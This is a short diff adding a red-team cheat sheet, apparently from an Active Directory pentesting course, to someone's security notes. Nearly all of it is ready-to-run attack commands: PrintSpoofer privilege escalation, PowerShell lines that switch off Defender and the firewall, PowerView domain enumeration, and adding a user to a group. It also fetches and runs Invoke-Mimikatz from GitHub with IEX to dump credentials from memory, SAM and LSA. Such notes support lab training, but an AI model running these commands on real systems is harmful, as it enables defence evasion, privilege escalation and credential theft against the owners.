@@ -11,8 +11,69 @@ https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20an
 https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993
 ```
 
+RED TEAM AD KURS
+
+PrintSpoofer
 ```
+PrintSpoofer.exe -d 1 -c cmd
 ```
+
+Disable AV, FW
+```
+powershell -ep bypass
+Set-MpPreference -DisableRealtimeMonitoring $true
+Set-MpPreference -DisableAVProtection $true
+netsh advfirewall set allprofiles state off
+```
+
+AD commands
+```
+import-module .\SharpHound.ps1
+import-module .\Powerview.ps1
+or
+. .\Powerview.ps1
+
+Get-DomainUser -Name blaadmin
+
+Get-DomainUser -SPN
+Get-DomainUser -Properties samaccountname,memberof,description
+
+whoami /groups
+
+Get-DomainGroup =Name "Domain admins"
+
+Get-Domain
+
+Get-DomainGroup -Domain pentesting.local
+Get-DomainGroupMember -Name "Domain Admins" -Recurse
+
+Get-DomainGroup -Username "bladmin"
+
+Get-DomainGPO -ComputerName student
+
+Get-DomainOU
+
+Find-DomainShare -Verbose
+
+cd \\fileshare.pentesting.local\Fileshare
+
+.\ADRecon.ps1 -OutputDir ALL-ADRecon -OutputType HTML
+
+Add-DomainGroupMember -Identity 'Hidden' -Members 'student' -Domain 'pentesting'
+
+Enter-PSSession -Computername dc01
+
+Invoke-Command -ComputerName dc01 -ScriptBlock{whoami /groups;hostname}
+
+import-module .\invoke-mimikatz.ps1
+
+IEX (New-Object System.Net.Webclient).DownloadString('https://raw.githubusercontent.com/clymb3r/PowerShell/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1')
+Invoke-Mimikatz -DumpCreds #Dump creds from memory
+Invoke-Mimikatz -Command '"privilege::debug" "token::elevate" "sekurlsa::logonpasswords" "lsadump::lsa /inject" "lsadump::sam" "lsadump::cache" "sekurlsa::ekeys" "exit"'
+
+net user student1 /domain
+```
+
 
 Portforwarding Tools
 ```
